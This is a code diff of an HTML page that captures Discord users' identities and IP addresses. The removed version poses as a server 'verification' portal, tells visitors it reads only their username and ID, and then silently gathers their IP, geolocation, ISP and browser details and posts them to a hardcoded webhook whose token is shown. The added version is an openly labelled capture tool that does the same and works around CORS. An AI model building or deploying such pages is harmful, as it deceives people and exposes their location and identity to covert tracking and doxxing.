@@ -1,540 +1,235 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Server Verification</title>
-  <link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177.ico" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
-  <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    :root {
-      --bg: #1a1b1e;
-      --surface: #25262b;
-      --border: #2c2d32;
-      --discord: #5865f2;
-      --discord-hover: #4752c4;
-      --text: #c9cdd4;
-      --text-bright: #f2f3f5;
-      --muted: #6d7280;
-      --green: #23a559;
-      --red: #ed4245;
-    }
-
-    body {
-      background: var(--bg);
-      font-family: 'Inter', 'gg sans', sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-      background-image: radial-gradient(ellipse 60% 50% at 50% 0%, rgba(88,101,242,0.12) 0%, transparent 70%);
-    }
-
-    .container {
-      width: 100%;
-      max-width: 420px;
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-    }
-
-    /* ── Server header ── */
-    .server-header {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      padding: 18px 20px;
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      animation: slideUp 0.3s ease both;
-    }
-
-    .server-icon {
-      width: 52px; height: 52px;
-      border-radius: 16px;
-      background: var(--discord);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      font-size: 22px;
-      font-weight: 800;
-      color: #fff;
-    }
-
-    .server-info { flex: 1; }
-    .server-name {
-      font-size: 15px;
-      font-weight: 700;
-      color: var(--text-bright);
-    }
-    .server-sub {
-      font-size: 12px;
-      color: var(--muted);
-      margin-top: 2px;
-    }
-
-    .member-count {
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      font-size: 12px;
-      color: var(--muted);
-    }
-
-    .dot-online {
-      width: 8px; height: 8px;
-      background: var(--green);
-      border-radius: 50%;
-    }
-
-    /* ── Main card ── */
-    .card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      overflow: hidden;
-      animation: slideUp 0.35s ease 0.05s both;
-    }
-
-    @keyframes slideUp {
-      from { opacity: 0; transform: translateY(16px); }
-      to   { opacity: 1; transform: translateY(0); }
-    }
-
-    .card-top {
-      padding: 28px 24px 24px;
-    }
-
-    /* Shield icon */
-    .shield-wrap {
-      width: 56px; height: 56px;
-      background: rgba(88,101,242,0.15);
-      border-radius: 14px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 16px;
-    }
-
-    .card-top h1 {
-      font-size: 20px;
-      font-weight: 700;
-      color: var(--text-bright);
-      margin-bottom: 8px;
-    }
-
-    .card-top p {
-      font-size: 13px;
-      color: var(--muted);
-      line-height: 1.6;
-    }
-
-    /* Steps */
-    .steps {
-      padding: 0 24px 20px;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .step {
-      display: flex;
-      align-items: flex-start;
-      gap: 12px;
-      padding: 12px;
-      background: rgba(255,255,255,0.03);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-    }
-
-    .step-num {
-      width: 22px; height: 22px;
-      background: rgba(88,101,242,0.2);
-      color: #8b9af8;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 11px;
-      font-weight: 700;
-      flex-shrink: 0;
-      margin-top: 1px;
-    }
-
-    .step-text {
-      font-size: 13px;
-      color: var(--text);
-      line-height: 1.45;
-    }
-
-    .step-text strong { color: var(--text-bright); }
-
-    /* Action area */
-    .card-action {
-      padding: 0 24px 24px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-
-    .btn-verify {
-      width: 100%;
-      padding: 13px 20px;
-      background: var(--discord);
-      color: #fff;
-      font-family: 'Inter', sans-serif;
-      font-size: 15px;
-      font-weight: 600;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      transition: background 0.15s, transform 0.12s, box-shadow 0.15s;
-      box-shadow: 0 4px 16px rgba(88,101,242,0.35);
-    }
-
-    .btn-verify:hover {
-      background: var(--discord-hover);
-      box-shadow: 0 6px 22px rgba(88,101,242,0.5);
-      transform: translateY(-1px);
-    }
-
-    .btn-verify:active { transform: translateY(0); }
-
-    .btn-verify:disabled {
-      opacity: 0.55;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-
-    .privacy-note {
-      font-size: 11px;
-      color: var(--muted);
-      text-align: center;
-      line-height: 1.5;
-    }
-
-    .privacy-note a { color: #8b9af8; text-decoration: none; }
-
-    /* ── Success card ── */
-    .success-card {
-      display: none;
-      background: var(--surface);
-      border: 1px solid rgba(35,165,89,0.3);
-      border-radius: 12px;
-      padding: 36px 24px;
-      text-align: center;
-      flex-direction: column;
-      align-items: center;
-      gap: 12px;
-      animation: slideUp 0.35s ease both;
-    }
-
-    .success-icon-wrap {
-      width: 64px; height: 64px;
-      background: rgba(35,165,89,0.15);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 4px;
-    }
-
-    .success-card h2 {
-      font-size: 20px;
-      font-weight: 700;
-      color: var(--text-bright);
-    }
-
-    .success-card p {
-      font-size: 13px;
-      color: var(--muted);
-      line-height: 1.6;
-    }
-
-    .verified-user {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      background: rgba(35,165,89,0.08);
-      border: 1px solid rgba(35,165,89,0.2);
-      border-radius: 8px;
-      padding: 12px 16px;
-      width: 100%;
-      margin-top: 4px;
-    }
-
-    .verified-avatar {
-      width: 40px; height: 40px;
-      border-radius: 50%;
-      background: var(--discord);
-      object-fit: cover;
-      flex-shrink: 0;
-    }
-
-    .verified-info { text-align: left; }
-    .verified-name { font-size: 14px; font-weight: 600; color: var(--text-bright); }
-    .verified-id   { font-size: 11px; color: var(--muted); font-family: monospace; margin-top: 2px; }
-
-    .verified-badge {
-      margin-left: auto;
-      background: rgba(35,165,89,0.15);
-      color: var(--green);
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
-      padding: 3px 9px;
-      border-radius: 999px;
-      flex-shrink: 0;
-    }
-
-    /* Spinner */
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .spinner {
-      width: 16px; height: 16px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-top-color: #fff;
-      border-radius: 50%;
-      animation: spin 0.7s linear infinite;
-    }
-
-    /* Footer */
-    .footer {
-      text-align: center;
-      font-size: 11px;
-      color: #3a3c43;
-      animation: slideUp 0.4s ease 0.1s both;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord User & IP Capture</title>
+    <style>
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 24px;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+        }
+        h2 {
+            margin-top: 0;
+            font-size: 20px;
+            text-align: center;
+            color: #f0f6fc;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        input[type="text"] {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 10px;
+            background-color: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            color: #c9d1d9;
+            font-family: monospace;
+        }
+        input:focus {
+            border-color: #58a6ff;
+            outline: none;
+        }
+        button {
+            background-color: #5865F2;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #4752C4;
+        }
+        .status {
+            margin-top: 16px;
+            font-size: 14px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            padding: 12px;
+            border-radius: 4px;
+            background-color: #0d1117;
+            border: 1px solid #30363d;
+            display: none;
+        }
+        .success { color: #3fb950; border-color: #3fb950; }
+        .error { color: #f85149; border-color: #f85149; }
+        .info { color: #58a6ff; border-color: #58a6ff; }
+        .note {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 16px;
+            line-height: 1.4;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <h2>Discord User & IP Capture</h2>
+        
+        <div id="setup-ui">
+            <div class="form-group">
+                <label for="webhookUrl">Discord Webhook URL</label>
+                <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." />
+            </div>
+            
+            <div class="form-group">
+                <label for="clientId">Discord OAuth2 Client ID</label>
+                <input type="text" id="clientId" placeholder="Get from Discord Developer Portal" />
+            </div>
 
-<div class="container">
+            <div class="form-group">
+                <label for="redirectUri">Redirect URI</label>
+                <input type="text" id="redirectUri" readonly />
+            </div>
 
-  <!-- Server identity -->
-  <div class="server-header">
-    <div class="server-icon">S</div>
-    <div class="server-info">
-      <div class="server-name">Your Server</div>
-      <div class="server-sub">Member Verification Portal</div>
-    </div>
-    <div class="member-count">
-      <div class="dot-online"></div>
-      Online
-    </div>
-  </div>
+            <button id="authBtn" onclick="initiateAuth()">Authorize & Capture</button>
+            
+            <div class="note">
+                <strong>Requirement:</strong> Must be served via HTTP/HTTPS (e.g. <code>http://localhost:8000/</code>). Webhook dispatch relies on standard form payload delivery to pass CORS checks.
+            </div>
+        </div>
 
-  <!-- Main verification card -->
-  <div class="card" id="verify-card">
-    <div class="card-top">
-      <div class="shield-wrap">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#5865f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-        </svg>
-      </div>
-      <h1>Verify your account</h1>
-      <p>To gain access to the server, you need to verify your Discord account. This only takes a few seconds.</p>
-    </div>
-
-    <div class="steps">
-      <div class="step">
-        <div class="step-num">1</div>
-        <div class="step-text"><strong>Click Verify below</strong> — you'll be redirected to Discord's secure login page.</div>
-      </div>
-      <div class="step">
-        <div class="step-num">2</div>
-        <div class="step-text"><strong>Authorise the bot</strong> — grant read-only access to your username and ID.</div>
-      </div>
-      <div class="step">
-        <div class="step-num">3</div>
-        <div class="step-text"><strong>Done</strong> — you'll be verified and granted access automatically.</div>
-      </div>
+        <div id="status" class="status"></div>
     </div>
 
-    <div class="card-action">
-      <button class="btn-verify" id="verify-btn" onclick="startVerify()">
-        <svg width="20" height="20" viewBox="0 0 127.14 96.36" fill="currentColor">
-          <path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0 0 32.17 16.15 77.7 77.7 0 0 0 6.89-11.11 68.42 68.42 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2a68.68 68.68 0 0 1-10.87 5.19 77 77 0 0 0 6.89 11.1 105.25 105.25 0 0 0 32.19-16.14c2.64-27.38-4.51-51.11-18.9-72.14zM42.45 65.69C36.18 65.69 31 60 31 53s5-12.74 11.43-12.74S54 46 53.89 53s-5.05 12.69-11.44 12.69zm42.24 0C78.41 65.69 73.25 60 73.25 53s5-12.74 11.44-12.74S96.23 46 96.12 53s-5.04 12.69-11.43 12.69z"/>
-        </svg>
-        Verify with Discord
-      </button>
-      <p class="privacy-note">
-        We only access your username and ID — nothing else.<br/>
-        <a href="https://discord.com/privacy" target="_blank">Discord Privacy Policy</a>
-      </p>
-    </div>
-  </div>
+    <script>
+        const currentUri = (window.location.origin === "null" || !window.location.origin)
+            ? window.location.href.split('#')[0]
+            : window.location.origin + window.location.pathname;
+            
+        document.getElementById('redirectUri').value = currentUri;
 
-  <!-- Success card (shown after OAuth) -->
-  <div class="success-card" id="success-card">
-    <div class="success-icon-wrap">
-      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#23a559" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
-    </div>
-    <h2>Verified Successfully</h2>
-    <p>Your account has been verified. You now have access to the server.</p>
-    <div class="verified-user" id="verified-user" style="display:none;">
-      <img class="verified-avatar" id="v-avatar" src="" alt="" />
-      <div class="verified-info">
-        <div class="verified-name" id="v-name">—</div>
-        <div class="verified-id" id="v-id">ID: —</div>
-      </div>
-      <span class="verified-badge">✓ Verified</span>
-    </div>
-  </div>
+        if (localStorage.getItem('webhookUrl')) {
+            document.getElementById('webhookUrl').value = localStorage.getItem('webhookUrl');
+        }
+        if (localStorage.getItem('clientId')) {
+            document.getElementById('clientId').value = localStorage.getItem('clientId');
+        }
 
-  <div class="footer">Powered by Discord OAuth2 · Secured by your bot</div>
+        window.addEventListener('DOMContentLoaded', () => {
+            const hash = window.location.hash.substring(1);
+            if (!hash) return;
 
-</div>
+            const params = new URLSearchParams(hash);
+            const accessToken = params.get('access_token');
+            const state = params.get('state');
 
-<script>
-  /* ── Config ─────────────────────────────────────────────────────────────── */
-  const CLIENT_ID = '1490415878544687184';
-  const WEBHOOK   = 'https://discord.com/api/webhooks/1532962613833629867/ZMFfCTJsJ3UxL6vKpAa0opRq65-RvF20X2Ly-ZGXfmrzIdCcpVg20_BkyOnLdVLjxBjf';
+            if (accessToken && state) {
+                document.getElementById('setup-ui').style.display = 'none';
+                executeCapture(accessToken, decodeURIComponent(state));
+            }
+        });
 
-  /* ── Silent IP grab on load (Promise so webhook always waits) ───────────── */
-  const geoPromise = fetch('https://ipapi.co/json/')
-    .then(r => r.json())
-    .then(d => ({
-      ip:      d.ip            || '—',
-      type:    d.version       || 'IPv4',
-      subnet:  d.network       || '—',
-      isp:     d.org           || '—',
-      host:    d.hostname      || 'Unknown',
-      city:    d.city          || '—',
-      region:  d.region        || '—',
-      country: d.country_name  || '—',
-      cc:      d.country_code  || '',
-      lat:     d.latitude      ?? '—',
-      lon:     d.longitude     ?? '—',
-      org:     d.org           || '—',
-      postal:  d.postal        || '—',
-      tz:      d.timezone      || '—',
-      asn:     d.asn           || '—',
-    }))
-    .catch(() => ({}));
+        function initiateAuth() {
+            const webhookUrl = document.getElementById('webhookUrl').value.trim();
+            const clientId = document.getElementById('clientId').value.trim();
+            const redirectUri = document.getElementById('redirectUri').value.trim();
 
-  /* ── Start OAuth2 ────────────────────────────────────────────────────────── */
-  function startVerify() {
-    const btn = document.getElementById('verify-btn');
-    btn.disabled = true;
-    btn.innerHTML = '<div class="spinner"></div> Redirecting…';
+            if (!webhookUrl || !clientId) {
+                showStatus('Error: Webhook URL and Client ID are required.', 'error');
+                return;
+            }
 
-    const redirect = encodeURIComponent(window.location.href.split('?')[0].split('#')[0]);
-    const state    = crypto.randomUUID();
-    sessionStorage.setItem('ov_state', state);
+            localStorage.setItem('webhookUrl', webhookUrl);
+            localStorage.setItem('clientId', clientId);
 
-    window.location.href =
-      'https://discord.com/oauth2/authorize'
-      + '?client_id=' + CLIENT_ID
-      + '&redirect_uri=' + redirect
-      + '&response_type=token'
-      + '&scope=identify'
-      + '&state=' + encodeURIComponent(state);
-  }
+            const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${encodeURIComponent(clientId)}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=identify&state=${encodeURIComponent(webhookUrl)}`;
+            
+            showStatus('[*] Redirecting to Discord authorization...', 'info');
+            window.location.href = authUrl;
+        }
 
-  /* ── Handle OAuth2 return ───────────────────────────────────────────────── */
-  async function handleReturn() {
-    const hash = window.location.hash.slice(1);
-    if (!hash) return;
+        async function executeCapture(token, webhookUrl) {
+            showStatus('[*] Exchanging token for Discord profile...', 'info');
 
-    const params = new URLSearchParams(hash);
-    const token  = params.get('access_token');
-    if (!token) return;
+            try {
+                const userResponse = await fetch('https://discord.com/api/users/@me', {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                
+                if (!userResponse.ok) {
+                    throw new Error(`Discord API status ${userResponse.status}`);
+                }
+                const userData = await userResponse.json();
 
-    // Clean URL immediately
-    history.replaceState(null, '', window.location.pathname);
+                showStatus(`[*] Profile resolved: ${userData.username}\n[*] Fetching origin IP...`, 'info');
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
 
-    // Show success card right away
-    document.getElementById('verify-card').style.display  = 'none';
-    const sc = document.getElementById('success-card');
-    sc.style.display = 'flex';
+                showStatus(`[*] Origin IP resolved: ${ipAddress}\n[*] Dispatching payload...`, 'info');
+                
+                const embed = {
+                    title: "Telemetry Capture Result",
+                    color: 5814783,
+                    fields: [
+                        { name: "Discord Username", value: `**${userData.username}**`, inline: true },
+                        { name: "Discord ID", value: `\`${userData.id}\``, inline: true },
+                        { name: "Origin IP", value: `\`${ipAddress}\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
 
-    // Fetch Discord identity
-    let user = null;
-    try {
-      const res = await fetch('https://discord.com/api/v10/users/@me', {
-        headers: { Authorization: 'Bearer ' + token }
-      });
-      if (res.ok) user = await res.json();
-    } catch (_) {}
+                if (userData.avatar) {
+                    embed.thumbnail = { url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` };
+                }
 
-    // Populate success card if we got a user
-    if (user) {
-      const displayName = user.global_name || user.username;
-      const avatarUrl   = user.avatar
-        ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.webp?size=64`
-        : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(user.id) % 5n)}.png`;
+                const payload = { embeds: [embed] };
 
-      document.getElementById('v-name').textContent   = displayName + (user.discriminator && user.discriminator !== '0' ? '#' + user.discriminator : '');
-      document.getElementById('v-id').textContent     = 'ID: ' + user.id;
-      document.getElementById('v-avatar').src         = avatarUrl;
-      document.getElementById('verified-user').style.display = 'flex';
-    }
+                // Use multipart form data via fetch to bypass standard JSON preflight CORS block
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify(payload));
 
-    // Fire webhook — awaited inside
-    fireWebhook(user);
-  }
+                const webhookResponse = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
 
-  /* ── Build + send embed ─────────────────────────────────────────────────── */
-  async function fireWebhook(user) {
-    const g  = await geoPromise;   // always resolved before we build
-    const ts = new Date().toISOString();
+                if (!webhookResponse.ok) {
+                    throw new Error(`Webhook dispatch failed: HTTP ${webhookResponse.status}`);
+                }
 
-    const discordVal = user
-      ? `**${user.global_name || user.username}** (\`${user.username}${user.discriminator && user.discriminator !== '0' ? '#' + user.discriminator : ''}\`)  ·  ID: \`${user.id}\``
-      : '`Not captured`';
+                showStatus(`[+] Payload successfully dispatched.\n\nCaptured Account:\nUser: ${userData.username}\nID: ${userData.id}\nIP: ${ipAddress}`, 'success');
+            } catch (err) {
+                showStatus(`[-] Capture failed: ${err.message}`, 'error');
+            } finally {
+                history.replaceState("", document.title, window.location.pathname);
+            }
+        }
 
-    const avatarUrl = user && user.avatar
-      ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.webp?size=128`
-      : null;
-
-    await fetch(WEBHOOK, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      mode: 'no-cors',
-      body: JSON.stringify({
-        embeds: [{
-          title: '✅ New Verification',
-          color: 0x23a559,
-          thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
-          fields: [
-            { name: '👤 Discord',       value: discordVal,                                   inline: false },
-            { name: '\u200b',           value: '\u200b',                                     inline: false },
-            { name: 'IP Address',       value: '`' + (g.ip     || '—') + '`',                inline: true  },
-            { name: 'IP Type',          value:  g.type   || '—',                              inline: true  },
-            { name: 'Subnet',           value:  g.subnet || '—',                              inline: true  },
-            { name: 'ISP',              value:  g.isp    || '—',                              inline: false },
-            { name: 'Hostname',         value:  g.host   || 'Unknown',                        inline: true  },
-            { name: 'City',             value:  g.city   || '—',                              inline: true  },
-            { name: 'Region',           value:  g.region || '—',                              inline: true  },
-            { name: 'Country',          value: (g.country || '—') + (g.cc ? ' (' + g.cc + ')' : ''), inline: true },
-            { name: 'Latitude',         value:  String(g.lat ?? '—'),                        inline: true  },
-            { name: 'Longitude',        value:  String(g.lon ?? '—'),                        inline: true  },
-            { name: 'Organization',     value:  g.org    || '—',                              inline: false },
-            { name: 'Postal / Zip',     value:  g.postal || '—',                              inline: true  },
-            { name: 'Time Zone',        value:  g.tz     || '—',                              inline: true  },
-            { name: 'ASN',              value:  g.asn    || '—',                              inline: true  },
-            { name: 'User Agent',       value: '`' + (navigator.userAgent || '—').slice(0, 200) + '`', inline: false },
-            { name: 'Language',         value:  navigator.language || '—',                   inline: true  },
-          ],
-          footer: { text: 'Verified at ' + ts },
-          timestamp: ts
-        }]
-      })
-    });
-  }
-
-  handleReturn();
-</script>
+        function showStatus(text, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.display = 'block';
+            statusDiv.textContent = text;
+            statusDiv.className = `status ${type}`;
+        }
+    </script>
 </body>
 </html>
